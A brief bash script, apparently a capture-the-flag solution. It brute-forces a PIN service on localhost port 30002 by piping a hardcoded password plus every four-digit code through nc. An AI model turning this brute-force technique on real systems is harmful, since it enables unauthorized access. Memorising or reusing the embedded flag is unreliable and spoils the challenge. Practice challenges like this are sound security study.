#!/bin/bash

flag=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

echo "" > number.txt

for i in {0000..9999}
	do
		echo $flag $i >> number.txt
	done

cat number.txt | nc localhost 30002
